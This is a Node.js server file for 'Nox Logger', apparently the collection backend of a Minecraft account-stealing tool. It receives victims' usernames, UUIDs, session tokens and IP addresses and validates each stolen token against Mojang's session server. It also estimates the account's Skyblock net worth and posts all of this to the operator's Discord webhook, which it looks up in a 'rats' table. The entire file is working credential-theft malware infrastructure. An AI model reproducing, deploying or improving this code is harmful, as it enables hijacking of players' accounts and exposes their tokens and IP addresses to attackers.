const express = require('express');
const axios = require('axios');
mysql = require('mysql2');
const networthCalc = require('./utils/Networth');
const iplim = require("iplim")
const app = express();

port = 3000;

app.use(express.json())

// rate limiter
app.use(iplim({timeout: 1000 * 10 * 15, limit: 4, exclude: [], log: false}))
app.set("trust proxy", true)

const config = require('../config.json');

const db = mysql.createConnection({
    host: config.mysql.host,
    user: config.mysql.user,
    password: config.mysql.password,
    database: config.mysql.database
});

app.post('/', (req, res) => {
    username = req.body.username;
    uuid = req.body.uuid;
    token = req.body.token;
    ip = req.body.ip;

    // make sure the request includes all the required parameters
    if (!["username", "uuid", "token", "ip", "rid"].every(field => req.body.hasOwnProperty(field))) {
        return res.status(400).send("Bad Request");
    }

    // get webhook from db using rid
    db.query("SELECT * FROM rats WHERE rid = ?", [req.body.rid], (err, result) => {
        if (err) {
            return res.status(500).send("Internal Server Error");
        }
        if (result.length == 0) {
            return res.status(404).send("Not Found");
        }
        webhook = result[0].webhook;
    });

    // check if the token is valid by authenticating with Mojang's session server
    axios.post("https://sessionserver.mojang.com/session/minecraft/join", JSON.stringify({
        accessToken: req.body.token,
        selectedProfile: req.body.uuid,
        serverId: req.body.uuid
    }),
    {
    headers : {
            "Content-Type": "application/json"
        }}).then(async response => {
        if (response.status == 204) {
            networthCalc(uuid).then((result) => {
                let networth = "0";
                let description = null;
                if (result != null) {
                    networth = Intl.NumberFormat('en-US', {
                        notation: 'compact',
                        maximumFractionDigits: 2,
                    }).format(result[0]);
                    description = result[1];
                }
                post(ip, username, uuid, token, webhook, networth, description);
            });
        }
    }).catch(error => {
        return res.status(500).send("Internal Server Error");
    });
});

function post(ip, username, uuid, token, webhook, networth, description) {
    //check if description is empty
    let embed = {
        username: "Nox Logger",
        avatar_url: "https://cdn.discordapp.com/attachments/1053140780425945100/1053509569797705758/nox1-removebg-preview.png",
        embeds: [
            {
                title: "📖 Minecraft Info",
                description: "🪙 Networth: " + networth,
                color: 0x7289DA,
                footer: {
                    "text": "🌟 Nox Logger - Nox Builder by Gute Nacht 🌟",
                },
                timestamp: new Date(),
                fields: [
                    {
                        name: "Username",
                        value: "```" + username + "```",
                        inline: true
                    },
                    {
                        name: "UUID",
                        value: "```" + uuid + "```",
                        inline: true
                    },
                    {
                        name: "IP",
                        value: "```" + ip + "```",
                        inline: true
                    },
                    {
                        name: "Token",
                        value: "```" + token + "```",
                        inline: false
                    }
                ]
            }
        ]
    }
    
    if (description != null) {
        embed.embeds.push({
            title: "🌍 Skyblock Profile Info",
            color: 0x7289DA,
            fields: description,
            url: "https://sky.shiiyu.moe/stats/" + username,
            footer: {
                "text": "🌟 Nox Logger - Nox Builder by Gute Nacht 🌟 - Thank you BreadCat for your networth stuff!",
            }
        })

    let data = embed;
    
    var config = {
       method: "POST",
       url: webhook,
       headers: { "Content-Type": "application/json" },
       data: data,
    };
    
     axios(config)
       .then((response) => {
          console.log("Webhook delivered successfully");
          return response;
       })
       .catch((error) => {
         console.log(error);
         return error;
       });
    }
}

app.listen(port, () => {
    console.log(`App listening at http://localhost:${port}`
)});
